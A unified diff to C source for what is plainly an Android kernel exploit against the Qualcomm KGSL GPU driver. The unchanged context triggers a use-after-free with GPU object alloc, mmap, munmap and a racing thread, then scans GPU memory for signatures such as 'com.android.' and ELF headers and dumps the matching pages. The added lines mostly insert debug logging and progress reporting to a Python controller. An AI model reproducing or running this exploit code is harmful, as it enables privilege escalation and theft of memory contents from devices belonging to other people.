@@ -203,17 +203,32 @@ static void *bogus_racer(void *arg) {
 }
 
 int trigger_uaf() {
+    fprintf(stderr, "[UAF] allocating GPU object (size=0x%lx)...\n", (unsigned long)UAF_SIZE);
+    fflush(stderr);
     struct kgsl_gpuobj_alloc alloc = { .size = UAF_SIZE, .flags = 0x10000000ULL };
-    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc) < 0) return -1;
+    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc) < 0) {
+        fprintf(stderr, "[UAF] GPUOBJ_ALLOC failed: %s\n", strerror(errno));
+        return -1;
+    }
     uint32_t uaf_id = alloc.id;
+    fprintf(stderr, "[UAF] id=%u, mmap 0x%lx...\n", uaf_id, (unsigned long)UAF_START);
+    fflush(stderr);
 
     void *uaf_vma = mmap((void *)UAF_START, UAF_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
-    if (uaf_vma == MAP_FAILED) return -2;
+    if (uaf_vma == MAP_FAILED) {
+        fprintf(stderr, "[UAF] mmap failed: %s\n", strerror(errno));
+        return -2;
+    }
+    fprintf(stderr, "[UAF] memset 0x%lx bytes...\n", (unsigned long)UAF_SIZE);
+    fflush(stderr);
+    // Fast memset (memset already uses optimized routines, this is fine)
     memset(uaf_vma, 1, UAF_SIZE);
     munmap(uaf_vma, UAF_SIZE);
+    fprintf(stderr, "[UAF] unmapped, running race...\n");
+    fflush(stderr);
 
     mmap((void *)BOGUS_START, 4096 * 3, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
-    
+
     race_state_t rs = { .fd = kgsl_fd, .ready = 0 };
     pthread_t thread;
     pthread_create(&thread, NULL, bogus_racer, &rs);
@@ -223,6 +238,8 @@ int trigger_uaf() {
 
     struct kgsl_gpuobj_free fr = { .id = uaf_id };
     ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
+    fprintf(stderr, "[UAF] complete\n");
+    fflush(stderr);
     return 0;
 }
 
@@ -269,6 +286,11 @@ int main(int argc, char **argv) {
             uint64_t start, end;
             sscanf(line + 5, "%lx %lx", &start, &end);
             uint8_t buf[PAGE_SIZE];
+            uint64_t total = end - start;
+            uint64_t scanned = 0;
+            fprintf(stderr, "[SCAN] start=%lx end=%lx total=%lu pages\n",
+                    (unsigned long)start, (unsigned long)end, (unsigned long)(total / PAGE_SIZE));
+            fflush(stderr);
             for (uint64_t va = start; va < end; va += PAGE_SIZE) {
                 if (read_gpu_page(va, buf) == 0) {
                     int non_zero = 0;
@@ -283,7 +305,7 @@ int main(int argc, char **argv) {
                         if (memmem(buf, PAGE_SIZE, "KETO", 4)) found_sig = 1;
                         if (memmem(buf, PAGE_SIZE, "com.android.", 11)) found_sig = 2;
                         if (memmem(buf, PAGE_SIZE, "\x7f" "ELF", 4)) found_sig = 3;
-                        
+
                         if (found_sig) {
                             printf("MATCH:%lx:%d\n", (unsigned long)va, found_sig);
                             printf("DATA:%lx:%d\n", (unsigned long)va, PAGE_SIZE);
@@ -292,9 +314,22 @@ int main(int argc, char **argv) {
                         }
                     }
                 }
-                if ((va / PAGE_SIZE) % 50 == 0) usleep(1000); // Increased sleep for stability
+                scanned += PAGE_SIZE;
+                if ((va / PAGE_SIZE) % 100 == 0) {
+                    fprintf(stderr, "[SCAN] progress 0x%lx / 0x%lx (%lu%%)\n",
+                            (unsigned long)scanned, (unsigned long)total,
+                            (unsigned long)(100 * scanned / total));
+                    fflush(stderr);
+                    // Also send to stdout so Python can show real-time progress
+                    printf("PROGRESS:%lx:%lx\n", (unsigned long)scanned, (unsigned long)total);
+                    fflush(stdout);
+                    usleep(1000);
+                }
             }
+            fprintf(stderr, "[SCAN] done\n");
+            fflush(stderr);
             printf("SCAN_DONE\n");
+            fflush(stdout);
         } else if (strncmp(line, "quit", 4) == 0) {
             break;
         }
